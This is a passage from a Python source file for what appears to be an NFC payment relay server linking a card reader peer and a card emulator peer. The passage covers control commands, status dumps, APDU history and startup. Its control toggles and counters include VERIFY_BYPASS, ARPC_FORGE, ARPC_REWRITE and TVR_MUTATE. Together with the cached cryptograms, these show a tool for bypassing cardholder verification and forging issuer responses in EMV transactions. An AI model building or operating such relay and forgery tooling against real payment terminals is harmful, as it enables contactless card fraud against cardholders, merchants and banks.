            self._reset_session("control command", unlock_epoch=True)
            target = self.emulator_addr if addr == self.reader_addr else self.reader_addr
            if target:
                self._send_frame(target, constants.SID_CTRL, body)
            self._send_ctrl_response(addr, f"OK SESSION_RESET SEQ={self.state.seq}")
            return
        # -----------------------------------------------------------------
        # STATUS
        # -----------------------------------------------------------------
        if command == "STATUS":
            from constants import PROTOCOL_VERSION, CID_NAME_MAP
            aid_hex = self.state.selected_aid.hex().upper() if self.state.selected_aid else None
            status = {
                "ready": (self.reader_addr is not None and self.emulator_addr is not None),
                "reader_registered": self.reader_addr is not None,
                "emulator_registered": self.emulator_addr is not None,
                "reader_peer": list(self.reader_addr) if self.reader_addr else None,
                "emulator_peer": list(self.emulator_addr) if self.emulator_addr else None,
                "reader_card_present": self.state.card_present,
                "cdcvm_verified": self.state.cdcvm_verified,
                "cdcvm_evidence": self.state.cdcvm_evidence,
                "verify_bypass_enabled": self.state.verify_bypass_enabled,
                "verify_bypass_count": self.state.verify_bypass_count,
                "arpc_forge_enabled": self.state.arpc_forge_enabled,
                "arpc_forge_count": self.state.arpc_forge_count,
                "arpc_rewrite_enabled": self.state.arpc_rewrite_enabled,
                "arpc_rewrite_count": self.state.arpc_rewrite_count,
                "tvr_mutation_enabled": self.state.tvr_mutation_enabled,
                "tvr_mutation_count": self.state.tvr_mutation_count,
                "gpo_template": (f"0x{self.state.gpo_template:02X}"
                                 if self.state.gpo_template else None),
                "second_ae_pending": self.state.second_ae_pending,
                "second_ae_reason": self.state.second_ae_reason,
                "brand": self.state.brand,
                "selected_aid": aid_hex,
                "session_seq": self.state.seq,
                "session_epoch": self.active_epoch,
                "protocol_version": PROTOCOL_VERSION,
                "reader_protocol_version": self._peer_versions.get(self.reader_addr, 0),
                "emulator_protocol_version": self._peer_versions.get(self.emulator_addr, 0),
                "guard_phase": self.guard.status(),
            }
            self._send_ctrl_bytes(addr, json.dumps(status).encode())
            return
        # -----------------------------------------------------------------
        # DUMP_STATE / DUMP_LAST
        # -----------------------------------------------------------------
        if command == "DUMP_STATE":
            cache = self.state.arqc_cache
            from constants import CID_NAME_MAP, PROTOCOL_VERSION
            state_dump = {
                "session_seq": self.state.seq,
                "session_epoch": self.active_epoch,
                "protocol_version": PROTOCOL_VERSION,
                "brand": self.state.brand,
                "selected_aid": (self.state.selected_aid.hex().upper()
                                 if self.state.selected_aid else None),
                "gpo_template": (f"0x{self.state.gpo_template:02X}"
                                 if self.state.gpo_template else None),
                "second_ae_pending": self.state.second_ae_pending,
                "second_ae_reason": self.state.second_ae_reason,
                "cdcvm_verified": self.state.cdcvm_verified,
                "cdcvm_evidence": self.state.cdcvm_evidence,
                "arqc_cache": {
                    "template": f"0x{cache.template:02X}" if cache.template else None,
                    "cid": f"0x{cache.cid:02X}" if cache.cid is not None else None,
                    "cid_name": CID_NAME_MAP.get(cache.cid, "?") if cache.cid is not None else None,
                    "atc": cache.atc.hex().upper() if cache.atc else None,
                    "ac": cache.ac.hex().upper() if cache.ac else None,
                    "iad": cache.iad.hex().upper() if cache.iad else None,
                    "parse_notes": cache.parse_notes,
                    "is_complete": cache.is_complete(),
                },
                "counters": {
                    "verify_bypass": self.state.verify_bypass_count,
                    "arpc_forge": self.state.arpc_forge_count,
                    "arpc_rewrite": self.state.arpc_rewrite_count,
                    "tvr_mutation": self.state.tvr_mutation_count,
                },
                "toggles": {
                    "verify_bypass_enabled": self.state.verify_bypass_enabled,
                    "arpc_forge_enabled": self.state.arpc_forge_enabled,
                    "arpc_rewrite_enabled": self.state.arpc_rewrite_enabled,
                    "tvr_mutation_enabled": self.state.tvr_mutation_enabled,
                },
                "pending_capdu": (self.state.pending_capdu.hex().upper()
                                   if self.state.pending_capdu else None),
                "guard_phase": self.guard.status(),
            }
            self._send_ctrl_bytes(addr, json.dumps(state_dump, indent=2).encode())
            return
        if command == "DUMP_LAST":
            dump = get_apdu_history(20)
            self._send_ctrl_bytes(addr, json.dumps(dump, default=str).encode())
            return
        if command.startswith("DUMP_LAST "):
            try:
                n = int(command.split()[1])
                n = max(1, min(n, 300))
            except (ValueError, IndexError):
                n = 20
            dump = get_apdu_history(n)
            self._send_ctrl_bytes(addr, json.dumps(dump, default=str).encode())
            return
        # -----------------------------------------------------------------
        # Feature toggles
        # -----------------------------------------------------------------
        feature_map = {
            "VERIFY_BYPASS ON": ("verify_bypass_enabled", True),
            "VERIFY_BYPASS OFF": ("verify_bypass_enabled", False),
            "ARPC_FORGE ON": ("arpc_forge_enabled", True),
            "ARPC_FORGE OFF": ("arpc_forge_enabled", False),
            "ARPC_REWRITE ON": ("arpc_rewrite_enabled", True),
            "ARPC_REWRITE OFF": ("arpc_rewrite_enabled", False),
            "TVR_MUTATE ON": ("tvr_mutation_enabled", True),
            "TVR_MUTATE OFF": ("tvr_mutation_enabled", False),
        }
        if command in feature_map:
            attr, val = feature_map[command]
            setattr(self.state, attr, val)
            log.info(f"{attr.replace('_', ' ').title()} {'ENABLED' if val else 'DISABLED'} via CTRL")
            self._send_ctrl_response(addr, f"OK {command.split()[0]}={command.split()[1]}")
            return
        # -----------------------------------------------------------------
        # Packet-router mode change
        # -----------------------------------------------------------------
        if self._packet_router:
            parts = command.split(None, 1)
            if parts and parts[0] == "MODE" and len(parts) > 1:
                try:
                    self._packet_router.set_mode(parts[1])
                    self._send_ctrl_response(addr, f"OK MODE={self._packet_router.get_mode()}")
                except Exception as e:
                    self._send_ctrl_response(addr, f"ERR MODE: {e}")
                return
        # -----------------------------------------------------------------
        # Fallback - forward the control command to the other peer
        # -----------------------------------------------------------------
        target = self.emulator_addr if addr == self.reader_addr else self.reader_addr
        if target:
            self._send_frame(target, constants.SID_CTRL, body)

    # ------------------------------------------------------------------
    # 5.30  Helper - log connected devices
    # ------------------------------------------------------------------
    def _log_connected_devices(self, tag: str) -> None:
        """Emit a structured log line describing the current reader / emulator
        state.  This is called during startup, after a peer timeout, and any
        other place where a quick snapshot of the connected peers is useful."""
        reader = (
            f"{self.reader_addr[0]}:{self.reader_addr[1]} (id={self.reader_id})"
            if self.reader_addr
            else "<none>"
        )
        emulator = (
            f"{self.emulator_addr[0]}:{self.emulator_addr[1]} (id={self.emulator_id})"
            if self.emulator_addr
            else "<none>"
        )
        log.info(f"{tag}: reader={reader}, emulator={emulator}")

    # ------------------------------------------------------------------
    # 5.31  Helper - touch peer (update timestamps)
    # ------------------------------------------------------------------
    def _touch_peer(self, addr: Tuple[str, int]) -> None:
        """Update the last-seen timestamp for the given peer."""
        now = time.time()
        if addr == self.reader_addr:
            self.reader_last_seen = now
        elif addr == self.emulator_addr:
            self.emulator_last_seen = now
        # Keep a placeholder for the version; real value is set on REGISTER.
        self._peer_versions.setdefault(addr, 0)

# ------------------------------------------------------------------
# 6.  Main entry point
# ------------------------------------------------------------------
def main() -> None:
    import sys
    def _parse_cpu_set(spec: str) -> set[int]:
        cpus: set[int] = set()
        for part in spec.split(","):
            token = part.strip()
            if not token:
                continue
            if "-" in token:
                start_s, end_s = token.split("-", 1)
                start = int(start_s.strip())
                end = int(end_s.strip())
                if end < start:
                    raise ValueError(f"invalid CPU range: {token}")
                cpus.update(range(start, end + 1))
            else:
                cpus.add(int(token))
        if not cpus:
            raise ValueError("empty CPU set")
        return cpus

    def _apply_runtime_priority() -> None:
        cpu_set_spec = os.environ.get("RELAY_CPU_SET", "").strip()
        if cpu_set_spec:
            try:
                cpu_set = _parse_cpu_set(cpu_set_spec)
                os.sched_setaffinity(0, cpu_set)
                log.info(f"CPU affinity pinned via RELAY_CPU_SET={cpu_set_spec}")
            except Exception as exc:
                log.warning(f"Could not apply RELAY_CPU_SET={cpu_set_spec}: {exc}")

        rt_prio_spec = os.environ.get("RELAY_RT_PRIORITY", "").strip()
        if rt_prio_spec:
            try:
                rt_prio = int(rt_prio_spec)
                if rt_prio < 1 or rt_prio > 99:
                    raise ValueError("priority must be 1..99")
                os.sched_setscheduler(0, os.SCHED_RR, os.sched_param(rt_prio))
                log.info(f"Scheduler set to SCHED_RR priority={rt_prio}")
            except Exception as exc:
                log.warning(f"Could not apply RELAY_RT_PRIORITY={rt_prio_spec}: {exc}")

    port = int(sys.argv[1]) if len(sys.argv) > 1 else 5566
    _apply_runtime_priority()
    server = RelayServer(port=port)
    def request_shutdown(signum, frame) -> None:
        server._shutdown_requested = True
    signal.signal(signal.SIGTERM, request_shutdown)
    signal.signal(signal.SIGINT, request_shutdown)
    try:
        server.start()
    except KeyboardInterrupt:
        pass
    finally:
        server.stop()

if __name__ == "__main__":
    main()
